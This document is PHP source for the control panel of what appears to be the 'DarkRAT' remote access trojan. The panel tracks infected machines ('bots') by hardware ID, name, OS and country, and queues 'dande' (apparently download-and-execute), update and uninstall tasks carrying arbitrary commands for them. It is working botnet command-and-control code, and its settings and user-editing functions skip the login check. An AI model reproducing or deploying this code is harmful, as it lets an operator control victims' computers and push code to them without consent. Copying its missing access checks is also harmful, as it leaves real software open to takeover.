<?php

class Main{


         public function index(){

            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            //select count(*),now() as now  from bots where UNIX_TIMESTAMP(lastresponse) > UNIX_TIMESTAMP((now() + interval -3 minute))
            $sql = "SELECT *, UNIX_TIMESTAMP(lastresponse) as lastresponse, UNIX_TIMESTAMP(now()) as now FROM bots ORDER BY lastresponse DESC";
            $allbots = array();
            foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                $allbots[] = $row;
            }




             $sql = "SELECT country, count(*) as NUM FROM bots GROUP BY country";
             $return = array();
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                 $return[ strtolower( $row["country"])] = intval ($row["NUM"]);
             }


            $GLOBALS["tpl"]->assign("allbots", $allbots);
            $GLOBALS["tpl"]->assign("worldmap", json_encode($return));
        }


        public function tasks(){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            if(!empty($_POST["delete"])){
                $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM tasks WHERE id = ?");
                $statement->execute(array($_POST["taskid"]));
            }
            if(!empty($_POST["task"])) {
                if($_POST["task"] == "uninstall") {
                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
                    $statement->execute(array('[]', 1, 'uninstall', $_POST["task"])); 
                } elseif($_POST["task"] == "dande" || $_POST["task"] == "update") {
                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
                    $statement->execute(array('[]', 1, $_POST["command"], $_POST["task"])); 
                }
                header("refresh: 0");
            }
            if(!empty($_POST["taskid"]) && !empty($_POST["taskstatus"])) {
                if($_POST["taskstatus"] == "run"){
                    $taskstatus = 1;
                }else{
                    $taskstatus = 0;
                }
                $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks SET status = ? WHERE id = ?");
                $statement->execute(array($taskstatus, $_POST["taskid"]));
                header("Refresh: 0");
            }
            $sql = "SELECT COUNT(tasks_completed.id) as executions, tasks.* FROM tasks LEFT JOIN tasks_completed ON tasks.id = tasks_completed.taskid GROUP BY tasks.id";
            $allTasks = array();
            foreach ($GLOBALS["pdo"]->query($sql) as $row) {
               $allTasks[] = $row;
            }
            $GLOBALS["tpl"]->assign("allTasks", $allTasks);
        }

        public function login(){
            if(!empty($_POST)){
                $username = $_POST['userid'];
                $passwort = $_POST['pswrd'];
                
                $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE username = :username");
                $result = $statement->execute(array('username' => $username));
                $user = $statement->fetch();
                    
                //Überprüfung des Passworts
                if ($user !== false && password_verify($passwort, $user['passwort'])) {
                    $_SESSION['darkrat_userid'] = $user['id'];
                    header("Location: /dashboard");
                } else {
                    $errorMessage = "Incorect Details<br>";
                }  
            }
        }

        public function taskdetails($id){
            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="taskdetails";
            $sql = "SELECT tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
            LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
            LEFT JOIN tasks ON tasks_completed.taskid = tasks.id
            WHERE tasks_completed.taskid = ?";
            $tasks = array();
            $statement =  $GLOBALS["pdo"]->prepare($sql);
            $statement->execute(array($id));   
            while($row = $statement->fetch(PDO::FETCH_ASSOC)) {
                $tasks[] = $row;
            }

        


            $GLOBALS["tpl"]->assign("tasks", $tasks);
           // var_dump($id);
            //die();
        }

        public function logout(){
            session_destroy();
            Header("Location: /login");
        }

        public function edituser($id){
            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="edituser";

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE id = ?");
            $result = $statement->execute(array($id));
            $user = $statement->fetch();
            $GLOBALS["tpl"]->assign("user", $user);
            if(!empty($_POST)){
                $passwort_hash = password_hash($_POST["password"], PASSWORD_DEFAULT);
                $statement = $GLOBALS["pdo"]->prepare("UPDATE users SET passwort = ? WHERE id = ?");
                $result = $statement->execute(array($passwort_hash,$id));
                header("refresh: 2");
                die("Success Please wait...");
            }
        }

        public function settings()
        {
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users");
            $statement->execute(array());
            $users = $statement->fetchAll();

            $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
            $statementConfig->execute(array("1"));
            $config = $statementConfig->fetch();

           if(!empty($_POST)){

                if(!empty($_POST["enryptionkey"])){
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET enryptionkey = ? WHERE id = ?");
                    $result = $statement->execute(array($_POST["enryptionkey"],1));
                }

           }






            $GLOBALS["tpl"]->assign("users", $users);
            $GLOBALS["tpl"]->assign("config", $config);




        }
        public  function botinfo($id){
            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="botinfo";
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE id = ?");
            $result = $statement->execute(array($id));
            $GLOBALS["tpl"]->assign("botinfo", $statement->fetch(PDO::FETCH_ASSOC));
        }
}